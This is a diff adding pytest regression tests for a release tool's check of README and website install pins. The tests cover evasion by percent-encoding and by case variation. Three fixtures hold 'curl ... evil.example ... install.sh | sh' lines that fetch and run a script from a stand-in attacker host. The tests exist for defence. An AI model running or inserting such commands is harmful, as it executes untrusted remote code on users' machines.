@@ -7843,6 +7843,165 @@ def test_phase11_verify_readme_pin_fails_for_wrong_owner_right_repo(
     assert "trusted" in out
 
 
+def test_phase11_verify_readme_pin_fails_for_percent_encoded_install_sh(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A URL whose "install.sh" is partly percent-encoded
+    (``%69nstall.sh``, where ``%69`` decodes to ``i``) on an untrusted
+    host, referencing the project, must still fail the README check.
+
+    Regression: candidate extraction required the literal substring
+    "install.sh" to appear in the RAW text. Percent-encoding even one
+    character breaks that literal match, so the URL produced ZERO
+    candidates and evaded classification entirely — worse than
+    "untrusted", it produced no check at all.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    (root / "README.md").write_text(
+        "# proj\n\ncurl -fsSL "
+        f"https://evil.example/punt-labs/proj/{install_sha}"
+        "/%69nstall.sh | sh\n"
+    )
+    _git(["add", "README.md"], cwd=d)
+    _git(["commit", "-m", "pin readme to percent-encoded install.sh"], cwd=d)
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✗ README pin" in out
+    assert "trusted" in out
+
+
+def test_phase11_verify_website_sha_fails_for_percent_encoded_repo_segment(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A URL whose repo-name segment is partly percent-encoded
+    (``%70roj``, where ``%70`` decodes to ``p``) on an untrusted host
+    must still fail the website check.
+
+    Regression: the "does this reference our project" test searched the
+    RAW, undecoded path for the plain-text repo name. Percent-encoding
+    one character of the repo segment hides it from that plain-text
+    search, so the URL was silently ignored instead of flagged.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    projects = [
+        {
+            "id": "proj",
+            "version": version,
+            "githubUrl": "https://github.com/punt-labs/proj",
+            "installCommand": (
+                "curl -fsSL https://evil.example/punt-labs/"
+                f"%70roj/{install_sha}/install.sh | sh"
+            ),
+        }
+    ]
+    _make_sibling(
+        tmp_path,
+        "public-website",
+        {"src/data/projects.json": json.dumps(projects, indent=2) + "\n"},
+    )
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✗ website SHA" in out
+    assert "trusted" in out
+
+
+def test_phase11_verify_readme_pin_fails_for_uppercase_repo_on_untrusted_host(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A case-varied repo name (``PROJ`` vs ``proj``) on an untrusted host
+    must still fail the README check.
+
+    Regression: the "does this reference our project" test compared the
+    path against the repo name case-SENSITIVELY, but GitHub itself routes
+    repository URLs case-insensitively — a case-sensitive comparison let
+    ``.../PROJ/...`` evade detection on a host that isn't GitHub at all.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    (root / "README.md").write_text(
+        "# proj\n\ncurl -fsSL "
+        f"https://evil.example/punt-labs/PROJ/{install_sha}"
+        "/install.sh | sh\n"
+    )
+    _git(["add", "README.md"], cwd=d)
+    _git(["commit", "-m", "pin readme to uppercase repo on untrusted host"], cwd=d)
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    with pytest.raises(ReleaseError):
+        _phase11_verify(info, version, dry_run=False)
+
+    out = capsys.readouterr().out
+    assert "✗ README pin" in out
+    assert "trusted" in out
+
+
+def test_phase11_verify_website_sha_passes_for_uppercase_repo_on_trusted_host(
+    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]
+) -> None:
+    """A case-varied repo name (``PROJ`` vs ``proj``) on the TRUSTED
+    raw.githubusercontent.com host is exactly as trusted as the canonical
+    casing, and its SHA is still currency-checked and passes.
+
+    GitHub routes repository URLs case-insensitively, so a real pin using
+    ``.../PROJ/...`` is not an attack — comparing case-sensitively would
+    false-fail a legitimate pin.
+    """
+    version = "0.1.0"
+    root = _setup_fully_passing_verify(tmp_path, version)
+    d = str(root)
+
+    install_sha = _git_out(["log", "-1", "--format=%H", "--", "install.sh"], cwd=d)
+    projects = [
+        {
+            "id": "proj",
+            "version": version,
+            "githubUrl": "https://github.com/punt-labs/proj",
+            "installCommand": (
+                "curl -fsSL https://raw.githubusercontent.com/punt-labs/"
+                f"PROJ/{install_sha}/install.sh | sh"
+            ),
+        }
+    ]
+    _make_sibling(
+        tmp_path,
+        "public-website",
+        {"src/data/projects.json": json.dumps(projects, indent=2) + "\n"},
+    )
+
+    _patch_pypi_probe(monkeypatch)
+    info = detect(root)
+
+    _phase11_verify(info, version, dry_run=False)  # must not raise
+
+    out = capsys.readouterr().out
+    assert "✓ website SHA" in out
+
+
 # --- Phase 11: matches_install_sha() commit-identity resolution ---
 
 
